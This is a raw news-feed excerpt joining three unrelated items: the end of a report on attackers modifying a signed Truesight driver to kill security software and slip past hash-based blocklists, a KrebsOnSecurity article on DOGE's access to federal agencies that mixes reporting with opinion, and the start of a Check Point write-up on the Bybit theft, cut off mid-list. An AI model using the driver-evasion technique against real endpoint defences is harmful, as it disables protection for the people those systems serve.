&lt;p&gt;In the uncovered massive campaign, the attackers leveraged thousands of initial-stage malicious samples and exploited over 2,500 distinct variants of the legacy Truesight driver. By modifying specific parts of the driver while preserving its digital signature, the attackers bypassed common detection methods, including the latest Microsoft Vulnerable Driver Blocklist and LOLDrivers detection mechanisms, allowing them to evade detection for months. Exploiting Arbitrary Process Termination vulnerability allowed the EDR/AV killer module to target and disable processes commonly associated with security solutions, further enhancing the campaign’s stealth.&lt;/p&gt;



&lt;p&gt;This case highlights a key lesson: hash-based detection alone is not sufficient enough to identify sophisticated attacks. The attackers were able to modify the driver in ways that made hash-based checks ineffective, reinforcing the need for more comprehensive detection strategies. Windows security mechanisms, such as the built-in Microsoft Vulnerable Driver Blocklist, offer a more robust approach by blocking drivers based on attributes beyond just hashes. This multi-faceted approach is critical for improving detection and protection against evolving threats.&lt;/p&gt;



&lt;p&gt;The&amp;nbsp;&lt;strong&gt;latest updates&lt;/strong&gt;&amp;nbsp;to the Microsoft Vulnerable Driver Blocklist, which&amp;nbsp;&lt;strong&gt;now&lt;/strong&gt;&amp;nbsp;includes the legacy Truesight driver exploited in this campaign, effectively prevent loading all its variants. We recommend enabling and applying the latest blocklist updates on all Windows systems.&lt;/p&gt;

&lt;p&gt;Earlier this week, technologists with Elon Musk&amp;#8217;s &lt;strong&gt;Department of Government Efficiency&lt;/strong&gt; (DOGE) &lt;a href="https://www.nextgov.com/cybersecurity/2025/02/doge-employee-edward-coristine-lands-cisa-dhs-email/403126/" rel="noopener" target="_blank"&gt;arrived at CISA&lt;/a&gt; and gained access to the agency&amp;#8217;s email and networked files. Those DOGE staffers include &lt;strong&gt;Edward &amp;#8220;Big Balls&amp;#8221; Coristine&lt;/strong&gt;, a &lt;a href="https://krebsonsecurity.com/2025/02/teen-on-musks-doge-team-graduated-from-the-com/" rel="noopener" target="_blank"&gt;19-year-old former denizen of the &amp;#8220;Com,&amp;#8221;&lt;/a&gt; an archipelago of Discord and Telegram chat channels that function as a kind of distributed &lt;a href="https://krebsonsecurity.com/2024/09/the-dark-nexus-between-harm-groups-and-the-com/" rel="noopener" target="_blank"&gt;cybercriminal social network&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The investigative journalist &lt;strong&gt;Jacob Silverman&lt;/strong&gt; &lt;a href="https://www.jacobsilverman.com/p/prominent-doge-staffer-is-grandson" rel="noopener" target="_blank"&gt;writes&lt;/a&gt; that Coristine is the grandson of &lt;strong&gt;Valery Martynov&lt;/strong&gt;, a KGB double agent who spied for the United States. Silverman recounted how Martynov&amp;#8217;s wife &lt;strong&gt;Natalya Martynova&lt;/strong&gt; moved to the United States with her two children after her husband&amp;#8217;s death.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Her son became a Virginia police officer who sometimes posts comments on blogs about his historically famous father,&amp;#8221; Silverman wrote. &amp;#8220;Her daughter became a financial professional who married Charles Coristine, the proprietor of LesserEvil, a snack company. Among their children is a 19-year-old young man named Edward Coristine, who currently wields an unknown amount of power and authority over the inner-workings of our federal government.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Another member of DOGE is &lt;strong&gt;Christopher Stanley&lt;/strong&gt;, formerly senior director for security engineering at X and principal security engineer at Musk&amp;#8217;s &lt;strong&gt;SpaceX&lt;/strong&gt;. Stanley, 33, had a brush with celebrity on Twitter in 2015 when he leaked the user database for the DDoS-for-hire service &lt;strong&gt;LizardStresser&lt;/strong&gt;, and soon faced threats of physical violence against his family.&lt;/p&gt;
&lt;p&gt;My &lt;a href="https://krebsonsecurity.com/2015/01/another-lizard-arrested-lizard-lair-hacked/" rel="noopener" target="_blank"&gt;2015 story on that leak&lt;/a&gt; did not name Stanley, but he exposed himself as the source by posting a video about it on his Youtube channel. A review of domain names registered by Stanley shows he went by the nickname &amp;#8220;enKrypt,&amp;#8221; and was the former owner of a pirated software and hacking forum called &lt;strong&gt;error33[.]net&lt;/strong&gt;, as well as &lt;strong&gt;theC0re&lt;/strong&gt;, a video game cheating community.&lt;/p&gt;
&lt;h2&gt;&amp;#8220;A NATIONAL CYBERATTACK&amp;#8221;&lt;/h2&gt;
&lt;p&gt;DOGE has been steadily gaining sensitive network access to federal agencies that hold a staggering amount of personal and financial information on Americans, including the &lt;strong&gt;Social Security Administration &lt;/strong&gt;(SSA), the &lt;strong&gt;Department of Homeland Security&lt;/strong&gt;, the &lt;strong&gt;Office of Personnel Management&lt;/strong&gt; (OPM), and the &lt;strong&gt;Treasury Department&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Most recently, DOGE has sought broad access to systems at the &lt;strong&gt;Internal Revenue Service&lt;/strong&gt; that contain the personal tax information on millions of Americans, including how much individuals earn and owe, property information, and even details related to child custody agreements. The New York Times &lt;a href="https://www.nytimes.com/2025/02/21/us/politics/irs-doge-gavin-kliger.html" rel="noopener" target="_blank"&gt;reported Friday&lt;/a&gt; that the IRS had reached an agreement whereby a single DOGE employee &amp;#8212; 25-year-old &lt;strong&gt;Gavin Kliger &lt;/strong&gt;&amp;#8212; will be allowed to see only anonymized taxpayer information.&lt;/p&gt;
&lt;p&gt;The rapidity with which DOGE has rifled through one federal database after another in the name of unearthing &amp;#8220;massive fraud&amp;#8221; by government agencies has alarmed many security experts, who warned that DOGE&amp;#8217;s actions bypassed essential safeguards and security measures.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The most alarming aspect isn’t just the access being granted,&amp;#8221; &lt;a href="https://www.schneier.com/blog/archives/2025/02/doge-as-a-national.html" rel="noopener" target="_blank"&gt;wrote&lt;/a&gt; &lt;strong&gt;Bruce Schneier&lt;/strong&gt; and &lt;strong&gt;Davi Ottenheimer&lt;/strong&gt;, referring to DOGE as a national cyberattack. &amp;#8220;It&amp;#8217;s the systematic dismantling of security measures that would detect and prevent misuse—including standard incident response protocols, auditing, and change-tracking mechanisms—by removing the career officials in charge of those security measures and replacing them with inexperienced operators.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Jacob Williams&lt;/strong&gt; is a former hacker with the &lt;strong&gt;U.S. National Security Agency&lt;/strong&gt; who now works as managing director of the cybersecurity firm &lt;strong&gt;Hunter Labs&lt;/strong&gt;. Williams kicked a virtual hornet&amp;#8217;s nest last week when he posted on LinkedIn that the network incursions by DOGE were &amp;#8220;a bigger threat to U.S. federal government information systems than China.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Williams said while he doesn&amp;#8217;t believe anyone at DOGE would intentionally harm the integrity and availability of these systems, it&amp;#8217;s widely reported (and not denied) that DOGE introduced code changes into multiple federal IT systems. These code changes, he maintained, are not following the normal process for vetting and review given to federal government IT systems.&lt;/p&gt;
&lt;p&gt;&amp;#8220;For those thinking &amp;#8216;I&amp;#8217;m glad they aren’t following the normal federal government IT processes, those are too burdensome&amp;#8217; I get where you’re coming from,&amp;#8221; Williams &lt;a href="https://www.linkedin.com/pulse/red-tape-security-controls-jacob-williams-adwqe/?trackingId=l8be8vjAEQRKTRSklk%2BZrA%3D%3D" rel="noopener" target="_blank"&gt;wrote&lt;/a&gt;. &amp;#8220;But another name for &amp;#8216;red tape&amp;#8217; are &amp;#8216;controls.&amp;#8217; If you&amp;#8217;re comfortable bypassing controls for the advancement of your agenda, I have questions – mostly about whether you do this in your day job too. Please tag your employer letting them know your position when you comment that controls aren’t important (doubly so if you work in cybersecurity). All satire aside, if you&amp;#8217;re comfortable abandoning controls for expediency, I implore you to decide where the line is that you won&amp;#8217;t cross in that regard.&amp;#8221;&lt;/p&gt;
&lt;p&gt;The DOGE website&amp;#8217;s &amp;#8220;wall of receipts&amp;#8221; boasts that Musk and his team have saved the federal government more than $55 billion through staff reductions, lease cancellations and terminated contracts. But a team of reporters at &lt;strong&gt;The New York Times&lt;/strong&gt; found the math that could back up those checks is marred with accounting errors, incorrect assumptions, outdated data and other mistakes.&lt;/p&gt;
&lt;p&gt;For example, DOGE claimed it saved $8 billion in one contract, when the total amount was actually $8 million, The Times found.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Some contracts the group claims credit for were double- or triple-counted,&amp;#8221; reads &lt;a href="https://www.nytimes.com/2025/02/18/upshot/doge-contracts-musk-trump.html" rel="noopener" target="_blank"&gt;a Times story with six bylines&lt;/a&gt;. &amp;#8220;Another initially contained an error that inflated the totals by billions of dollars. While the DOGE team has surely cut some number of billions of dollars, its slapdash accounting adds to a pattern of recklessness by the group, which has recently gained access to sensitive government payment systems.&amp;#8221;&lt;/p&gt;
&lt;p&gt;So far, the DOGE website does not inspire confidence: We learned last week that the doge.gov administrators somehow left their database wide open, allowing someone to publish messages that &lt;a href="https://arstechnica.com/tech-policy/2025/02/doges-gov-site-lampooned-as-coders-quickly-realize-it-can-be-edited-by-anyone/" rel="noopener" target="_blank"&gt;ridiculed the site&amp;#8217;s insecurity&lt;/a&gt;.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70474" style="width: 762px;"&gt;&lt;img alt="" class="wp-image-70474" height="478" src="https://krebsonsecurity.com/wp-content/uploads/2025/02/doge-experts.png" width="752" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70474"&gt;A screenshot of the DOGE website after it was defaced with the message: &amp;#8220;These &amp;#8216;experts&amp;#8217; left their database open &amp;#8211; roro&amp;#8221;&lt;/p&gt;&lt;/div&gt;
&lt;h2&gt;APPOINTMENTS&lt;/h2&gt;
&lt;p&gt;Trump&amp;#8217;s efforts to grab federal agencies by their data has seen him replace career civil servants who refused to allow DOGE access to agency networks. &lt;a href="https://www.cnn.com/2025/02/17/politics/social-security-head-steps-down-doge-access/index.html" rel="noopener" target="_blank"&gt;CNN reports&lt;/a&gt; that &lt;strong&gt;Michelle King&lt;/strong&gt;, acting commissioner of the Social Security Administration for more than 30 years, was shown the door after she denied DOGE access to sensitive information.&lt;/p&gt;
&lt;p&gt;King was replaced by &lt;strong&gt;Leland Dudek&lt;/strong&gt;, formerly a senior advisor in the SSA&amp;#8217;s Office of Program Integrity. This week, Dudek posted a now-deleted message on LinkedIn acknowledging he had been placed on administrative leave for cooperating with DOGE.&lt;/p&gt;
&lt;p&gt;&amp;#8220;I confess,&amp;#8221; Dudek wrote. &amp;#8220;I bullied agency executives, shared executive contact information, and circumvented the chain of command to connect DOGE with the people who get stuff done. I confess. I asked where the fat was and is in our contracts so we can make the right tough choices.&amp;#8221;&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70473" style="width: 760px;"&gt;&lt;img alt="" class="wp-image-70473" height="627" src="https://krebsonsecurity.com/wp-content/uploads/2025/02/dudek-li.png" width="750" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70473"&gt;Dudek&amp;#8217;s message on LinkedIn.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;According to Wired, the &lt;strong&gt;National Institute of Standards and Technology&lt;/strong&gt; (NIST) was also bracing this week for roughly 500 staffers to be fired, which could have serious impacts on NIST’s cybersecurity standards and software vulnerability tracking work.&lt;/p&gt;
&lt;p&gt;&amp;#8220;And cuts last week at the US Digital Service included the cybersecurity lead for the central Veterans Affairs portal, VA.gov, potentially leaving VA systems and data more vulnerable without someone in his role,&amp;#8221; Wired&amp;#8217;s Andy Greenberg and Lily Hay Newman &lt;a href="https://www.wired.com/story/1-4-billion-stolen-from-bybit-in-biggest-crypto-theft-ever/" rel="noopener" target="_blank"&gt;wrote&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;NextGov &lt;a href="https://www.nextgov.com/defense/2025/02/katie-arrington-announces-she-dods-new-ciso/403091/?oref=ng-homepage-river" rel="noopener" target="_blank"&gt;reports&lt;/a&gt; that Trump named the Department of Defense&amp;#8217;s new chief information security officer: &lt;strong&gt;Katie Arrington&lt;/strong&gt;, a former South Carolina state lawmaker who helped steer Pentagon cybersecurity contracting policy before being put on leave amid accusations that she disclosed classified data from a military intelligence agency.&lt;/p&gt;
&lt;p&gt;NextGov notes that the &lt;strong&gt;National Security Agency&lt;/strong&gt; suspended her clearance in 2021, although the exact reasons that led to the suspension and her subsequent leave were classified. Arrington argued that the suspension was a politically motivated effort to silence her.&lt;/p&gt;
&lt;p&gt;Trump also appointed the former chief operating officer of the &lt;strong&gt;Republican National Committee&lt;/strong&gt; as the new head of the Office of National Cyber Director. &lt;strong&gt;Sean Cairncross&lt;/strong&gt;, who has no formal experience in technology or security, will be responsible for coordinating national cybersecurity policy, advising the president on cyber threats, and ensuring a unified federal response to emerging cyber-risks, Politico &lt;a href="https://www.politico.com/news/2025/02/11/sean-cairncross-cyber-director-nomination-00203759" rel="noopener" target="_blank"&gt;writes&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DarkReading&lt;/strong&gt; &lt;a href="https://www.darkreading.com/cyber-risk/president-trump-nominate-former-rnc-official-national-cyber-director" rel="noopener" target="_blank"&gt;reports&lt;/a&gt; that Cairncross would share responsibility for advising the president on cyber matters, along with the director of cyber at the White House National Security Council (NSC) — a group that advises the president on all matters security related, and not just cyber.&lt;/p&gt;
&lt;h2&gt;CONSUMER PROTECTION?&lt;/h2&gt;
&lt;p&gt;The president also ordered staffers at the &lt;strong&gt;Consumer Financial Protection Bureau&lt;/strong&gt; (CFPB) to stop most work. Created by Congress in 2011 to be a clearinghouse of consumer complaints, the CFPB has sued some of the nation&amp;#8217;s largest financial institutions for violating consumer protection laws.&lt;/p&gt;
&lt;p&gt;The CFPB says its actions have put nearly $18 billion back in Americans&amp;#8217; pockets in the form of monetary compensation or canceled debts, and imposed $4 billion in civil money penalties against violators. The CFPB&amp;#8217;s homepage has featured a &amp;#8220;404: Page not found&amp;#8221; error for weeks now.&lt;/p&gt;
&lt;p&gt;Trump has appointed &lt;strong&gt;Russell Vought&lt;/strong&gt;, the architect of the conservative policy playbook &lt;strong&gt;Project 2025&lt;/strong&gt;, to be the CFPB&amp;#8217;s acting director. Vought has publicly favored abolishing the agency, as has Elon Musk, whose efforts to remake X into a payments platform would otherwise be regulated by the CFPB.&lt;/p&gt;
&lt;p&gt;The New York Times recently published a useful graphic showing all of the government staffing changes, including the firing of several top officials, affecting agencies with federal investigations into or regulatory battles with Musk&amp;#8217;s companies. Democrats on the House Judiciary Committee also have released &lt;a href="https://democrats-judiciary.house.gov/uploadedfiles/2025.02.13_fact_sheet_re_musk_investigations.pdf" rel="noopener" target="_blank"&gt;a comprehensive account (PDF)&lt;/a&gt; of Musk&amp;#8217;s various conflicts of interest.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70476" style="width: 740px;"&gt;&lt;img alt="" class="wp-image-70476" height="653" src="https://krebsonsecurity.com/wp-content/uploads/2025/02/newyorktimes-musk-conflicts.png" width="730" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70476"&gt;Image: nytimes.com&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;As the Times notes, Musk and his companies have repeatedly failed to comply with federal reporting protocols aimed at protecting state secrets, and these failures have prompted at least three federal reviews. Those include an inquiry launched last year by the Defense Department&amp;#8217;s Office of Inspector General. Four days after taking office, Trump fired the DoD inspector general along with 17 other inspectors general.&lt;/p&gt;
&lt;p&gt;The Trump administration also shifted the enforcement priorities of the &lt;strong&gt;U.S. Securities and Exchange Commission&lt;/strong&gt; (SEC) away from prosecuting misconduct in the cryptocurrency sector, reassigning lawyers and &lt;a href="https://www.sec.gov/newsroom/press-releases/2025-42" rel="noopener" target="_blank"&gt;renaming the unit&lt;/a&gt; to focus more on &amp;#8220;cyber and emerging technologies.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Reuters &lt;a href="https://www.reuters.com/technology/us-securities-regulator-drop-lawsuit-against-coinbase-exchange-says-2025-02-21/#:~:text=Feb%2021%20(Reuters)%20%2D%20Coinbase,platform%20and%20the%20broader%20sector." rel="noopener" target="_blank"&gt;reports&lt;/a&gt; that the former SEC chair &lt;strong&gt;Gary Gensler&lt;/strong&gt; made fighting misconduct in a sector he termed the &amp;#8220;wild west&amp;#8221; a priority for the agency, targeting not only cryptocurrency fraudsters but also the large firms that facilitate trading such as &lt;strong&gt;Coinbase&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;On Friday, Coinbase said the SEC planned to withdraw its lawsuit against the crypto exchange. Also on Friday, the cryptocurrency exchange &lt;strong&gt;Bybit&lt;/strong&gt; &lt;a href="https://therecord.media/hackers-drained-bybit-crypto-exchange-hack" rel="noopener" target="_blank"&gt;announced on X&lt;/a&gt; that a cybersecurity breach led to the theft of more than $1.4 billion worth of cryptocurrencies &amp;#8212; making it the largest crypto heist ever.&lt;span id="more-70399"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;ORGANIZED CRIME AND CORRUPTION&lt;/h2&gt;
&lt;p&gt;On Feb. 10, Trump &lt;a href="https://www.whitehouse.gov/presidential-actions/2025/02/pausing-foreign-corrupt-practices-act-enforcement-to-further-american-economic-and-national-security/" rel="noopener" target="_blank"&gt;ordered&lt;/a&gt; executive branch agencies to stop enforcing the &lt;strong&gt;U.S. Foreign Corrupt Practices Act&lt;/strong&gt;, which froze foreign bribery investigations, and even allows for &amp;#8220;remedial actions&amp;#8221; of past enforcement actions deemed &amp;#8220;inappropriate.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Trump&amp;#8217;s action also disbanded the &lt;strong&gt;Kleptocracy Asset Recovery Initiative&lt;/strong&gt; and &lt;strong&gt;KleptoCapture Task Force&lt;/strong&gt; &amp;#8212; units which proved their value in corruption cases and in seizing the assets of sanctioned Russian oligarchs &amp;#8212; and diverted resources away from investigating white-collar crime.&lt;/p&gt;
&lt;p&gt;That&amp;#8217;s according to the independent &lt;strong&gt;Organized Crime and Corruption Reporting Project&lt;/strong&gt; (OCCRP), an investigative journalism outlet that until very recently was funded in part by the &lt;strong&gt;U.S. Agency for International Development&lt;/strong&gt; (USAID).&lt;/p&gt;
&lt;p&gt;The &lt;a href="https://www.occrp.org/en" rel="noopener" target="_blank"&gt;OCCRP&lt;/a&gt; lost nearly a third of its funding and was forced to lay off 43 reporters and staff after Trump moved to shutter USAID and freeze its spending. NBC News &lt;a href="https://www.nbcnews.com/politics/politics-news/usaid-reduce-foreign-service-officers-trump-cuts-federal-government-rcna191122" rel="noopener" target="_blank"&gt;reports&lt;/a&gt; the Trump administration plans to gut the agency and leave fewer than 300 staffers on the job out of the current 8,000 direct hires and contractors.&lt;/p&gt;
&lt;p&gt;The &lt;strong&gt;Global Investigative Journalism Network&lt;/strong&gt; &lt;a href="https://gijn.org/stories/usaid-crisis-funding-future-independent-media/" rel="noopener" target="_blank"&gt;wrote&lt;/a&gt; this week that the sudden hold on USAID foreign assistance funding has frozen an estimated $268 million in agreed grants for independent media and the free flow of information in more than 30 countries &amp;#8212; including several under repressive regimes.&lt;/p&gt;
&lt;p&gt;Elon Musk has called USAID &amp;#8220;a criminal organization&amp;#8221; without evidence, and &lt;a href="https://www.nbcnews.com/politics/doge/elon-musk-boosted-false-usaid-conspiracy-theories-global-aid-rcna190646" rel="noopener" target="_blank"&gt;promoted fringe theories&lt;/a&gt; on his social media platform X that the agency operated without oversight and was rife with fraud. Just months before the election, USAID&amp;#8217;s Office of Inspector General &lt;a href="https://oig.usaid.gov/node/6814" rel="noopener" target="_blank"&gt;announced&lt;/a&gt; an investigation into USAID&amp;#8217;s oversight of Starlink satellite terminals provided to the government of Ukraine.&lt;/p&gt;
&lt;p&gt;KrebsOnSecurity this week heard from a trusted source that all outgoing email from USAID now carries a notation of &amp;#8220;&lt;a href="https://fam.state.gov/fam/12fam/12fam0540.html" rel="noopener" target="_blank"&gt;sensitive but unclassified&lt;/a&gt;,&amp;#8221; a designation that experts say could make it more difficult for journalists and others to obtain USAID email records under the Freedom of Information Act (FOIA). On Feb. 20, Fedscoop &lt;a href="https://fedscoop.com/usaid-emails-sensitive-but-unclassified-foia/" rel="noopener" target="_blank"&gt;reported&lt;/a&gt; also hearing the same thing from multiple sources, noting that the added message cannot be seen by senders until after the email is sent.&lt;/p&gt;
&lt;h2&gt;FIVE BULLETS&lt;/h2&gt;
&lt;p&gt;On Feb. 18, Trump issued &lt;a href="https://www.whitehouse.gov/presidential-actions/2025/02/ensuring-accountability-for-all-agencies/" rel="noopener" target="_blank"&gt;an executive order&lt;/a&gt; declaring that only the U.S. attorney general and the president can provide authoritative interpretations of the law for the executive branch, and that this authority extends to independent agencies operating under the executive branch.&lt;/p&gt;
&lt;p&gt;Trump is arguing that Article II, Clause 1 of the Constitution vests this power with the president. However, jurist.org &lt;a href="https://www.jurist.org/news/2025/02/trump-signs-order-declaring-only-president-and-ag-can-interpret-us-law-for-executive-branch/" rel="noopener" target="_blank"&gt;writes&lt;/a&gt; that Article II does not expressly state the president or any other person in the executive branch has the power to interpret laws.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The article states that the president is required to &amp;#8216;take care that the laws be faithfully executed,'&amp;#8221; Juris noted. &amp;#8220;Jurisdiction to interpret laws and determine constitutionality belongs to the judicial branch under Article III. The framers of the Constitution designed the separation of duties to prevent any single branch of government from becoming too powerful.&amp;#8221;&lt;/p&gt;
&lt;p&gt;The executive order requires all agencies to submit to &amp;#8220;performance standards and management objectives&amp;#8221; to be established by the White House Office of Management and Budget, and to report periodically to the president.&lt;/p&gt;
&lt;p&gt;Those performance metrics are already being requested: Employees at multiple federal agencies on Saturday reported receiving an email from the &lt;strong&gt;Office of Personnel Management&lt;/strong&gt; ordering them to reply with a set of bullet points justifying their work for the past week.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Please reply to this email with approx. 5 bullets of what you accomplished last week and cc your manager,&amp;#8221; the notice read. &amp;#8220;Please do not send any classified information, links, or attachments. Deadline is this Monday at 11:59 p.m. EST.&amp;#8221;&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70477" style="width: 490px;"&gt;&lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/02/agencyusers.png" rel="noopener" target="_blank"&gt;&lt;img alt="" class="wp-image-70477 size-full" height="783" src="https://krebsonsecurity.com/wp-content/uploads/2025/02/agencyusers.png" width="480" /&gt;&lt;/a&gt;&lt;p class="wp-caption-text" id="caption-attachment-70477"&gt;An email sent by the OPM to more than two million federal employees late in the afternoon EST on Saturday, Feb. 22.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;In a social media post Saturday, Musk said the directive came at the behest of President Trump, and that failure to respond would be taken as a resignation. Meanwhile, Bloomberg &lt;a href="https://www.bloomberg.com/news/articles/2025-02-23/doj-heads-tell-staff-not-to-reply-to-musk-demand-for-job-details" rel="noopener" target="_blank"&gt;writes&lt;/a&gt; the &lt;strong&gt;Department of Justice&lt;/strong&gt; has been urging employees to hold off replying out of concern doing so could trigger ethics violations. The &lt;strong&gt;National Treasury Employees Union&lt;/strong&gt; also is &lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/02/nteu-advisory.png" rel="noopener" target="_blank"&gt;advising its employees not to respond&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;A legal battle over Trump&amp;#8217;s latest executive order is bound to join &lt;a href="https://www.courtwatch.news/p/lawsuits-related-to-trump-admin-executive-orders" rel="noopener" target="_blank"&gt;more than 70 other lawsuits&lt;/a&gt; currently underway to halt the administration&amp;#8217;s efforts to massively reduce the size of the federal workforce through layoffs, firings and attrition.&lt;/p&gt;
&lt;h2&gt;KING TRUMP?&lt;/h2&gt;
&lt;p&gt;On Feb. 15, the president posted on social media, &amp;#8220;He who saves his Country does not violate any Law,&amp;#8221; citing a quote often attributed to the French dictator Napoleon Bonaparte. Four days later, Trump referred to himself as &amp;#8220;the king&amp;#8221; on social media, while the White House nonchalantly posted an illustration of him wearing a crown.&lt;/p&gt;
&lt;p&gt;Trump has been &lt;a href="https://www.washingtonpost.com/politics/2025/02/20/trump-third-term-king-unconstitutional/" rel="noopener" target="_blank"&gt;publicly musing about running for an unconstitutional third-term in office&lt;/a&gt;, a statement that some of his supporters dismiss as Trump just trying to rile his liberal critics. However, just days after Trump began his second term, &lt;strong&gt;Rep. Andy Ogles&lt;/strong&gt; (R-Tenn.) &lt;a href="https://www.cnbc.com/2025/01/23/trump-third-term-amendment-constitution-ogles.html" rel="noopener" target="_blank"&gt;introduced a bill&lt;/a&gt; to amend the Constitution so that Trump &amp;#8212; and any other future president &amp;#8212; can be elected to serve a third term.&lt;/p&gt;
&lt;p&gt;This week at the &lt;strong&gt;Conservative Political Action Conference&lt;/strong&gt; (CPAC), Rep. Ogles reportedly led a group of Trump supporters calling itself the &amp;#8220;Third Term Project,&amp;#8221; which is trying to gain support for the bill from GOP lawmakers. The event featured images of Trump depicted as Caesar.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70475" style="width: 618px;"&gt;&lt;img alt="" class="size-full wp-image-70475" height="733" src="https://krebsonsecurity.com/wp-content/uploads/2025/02/thirdtermproject.png" width="608" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70475"&gt;A banner at the CPAC conference this week in support of The Third Term Project, a group of conservatives trying to gain support for a bill to amend the Constitution and allow Trump to run for a third term.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Russia continues to be among the world&amp;#8217;s top exporters of cybercrime, narcotics, money laundering, human trafficking, disinformation, war and death, and yet the Trump administration has suddenly broken with the Western world in normalizing relations with Moscow.&lt;/p&gt;
&lt;p&gt;This week President Trump stunned U.S. allies by repeating Kremlin talking points that Ukraine is somehow responsible for Russia&amp;#8217;s invasion, and that &lt;strong&gt;Ukrainian President Volodymyr Zelensky&lt;/strong&gt; is a &amp;#8220;dictator.&amp;#8221; The president repeated these lies even as his administration is demanding that Zelensky give the United States half of his country&amp;#8217;s mineral wealth in exchange for a promise that Russia will cease its territorial aggression there.&lt;/p&gt;
&lt;p&gt;President Trump&amp;#8217;s servility toward &lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/02/thisisadictator.png" rel="noopener" target="_blank"&gt;an actual dictator&lt;/a&gt; &amp;#8212; &lt;strong&gt;Russian President Vladimir Putin&lt;/strong&gt; &amp;#8212; does not bode well for efforts to improve the cybersecurity of U.S. federal IT networks, or the private sector systems on which the government is largely reliant. In addition, this administration&amp;#8217;s baffling moves to alienate, antagonize and sideline our closest allies could make it more difficult for the United States to secure their ongoing cooperation in cybercrime investigations.&lt;/p&gt;
&lt;p&gt;It&amp;#8217;s also startling how closely DOGE&amp;#8217;s approach so far hews to tactics typically employed by ransomware gangs: A group of 20-somethings with names like &amp;#8220;Big Balls&amp;#8221; shows up on a weekend and gains access to your servers, deletes data, locks out key staff, takes your website down, and prevents you from serving customers.&lt;/p&gt;
&lt;p&gt;When the federal executive starts imitating ransomware playbooks against its own agencies while Congress largely gazes on in either bewilderment or amusement, we&amp;#8217;re in four-alarm fire territory. At least in theory, one can negotiate with ransomware purveyors.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=70399</guid><category>A Little Sunshine</category><category>Latest Warnings</category><category>Russia's War on Ukraine</category><category>The Coming Storm</category><category>Bruce Schneier</category><category>Bybit</category><category>Christopher Stanley</category><category>Coinbase</category><category>Conservative Political Action Conference</category><category>Consumer Financial Protection Bureau</category><category>Cybersecurity and Infrastructure Security Agency</category><category>Davi Ottenheimer</category><category>Department of Government Efficiency</category><category>Department of Homeland Security</category><category>Department of Justice</category><category>Edward Coristine</category><category>Gavin Kliger</category><category>Global Investigative Journalism Network</category><category>Hunter Labs</category><category>Internal Revenue Service</category><category>Jacob Silverman</category><category>Jacob Williams</category><category>Katie Arrington</category><category>KleptoCapture Task Force</category><category>Kleptocracy Asset Recovery Initiative</category><category>Leland Dudek</category><category>lizardstresser</category><category>Michelle King</category><category>Natalya Martynova</category><category>National Institute of Standards and Technology</category><category>National Treasury Employees Union</category><category>Office of Management and Budget</category><category>Office of Personnel Management</category><category>Organized Crime and Corruption Reporting Project</category><category>President Donald Trump</category><category>Project 2025</category><category>Rep.

&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/the-bybit-incident-when-research-meets-reality/"&gt;The Bybit Incident: When Research Meets Reality&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;Research by Dikla Barda, Roman Ziakin and Oded Vanunu&lt;/p&gt;



&lt;p&gt;On February 21&lt;sup&gt;st&lt;/sup&gt;, Check Point Blockchain Threat Intel System alerted on a critical attack log on the  Ethereum blockchain network.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-31120" height="139" src="https://research.checkpoint.com/wp-content/uploads/2025/02/bybit-img-1.jpg" width="1000" /&gt;&lt;/figure&gt;



&lt;p&gt;The log indicated that the AI engine identify anomality change with this transaction and categorize it as critical attack in real time. It was indicated that ByBit cold wallet got hacked, resulting in the theft of approximately $1.5 billion worth of digital assets, primarily in Ethereum tokens. This incident marks one of the largest thefts in the history of the digital asset industry.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-31121" height="492" src="https://research.checkpoint.com/wp-content/uploads/2025/02/bybit-img-2.jpg" width="1000" /&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading"&gt;&lt;strong&gt;Executive Summary:&lt;/strong&gt;&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;In one of the largest thefts in digital asset history, hackers gained unauthorized access to a multisig Ethereum wallet and stole $1.5 billion worth of digital assets, primarily consisting of Ethereum tokens.&lt;/li&gt;



&lt;li&gt;The recent incident with Bybit marks a new phase in attack methods, featuring advanced techniques for manipulating user interfaces. Rather than just targeting protocol flaws, the attackers used sophisticated infrastructure compromise to manipulate the UI that signers interacted with.&lt;/li&gt;



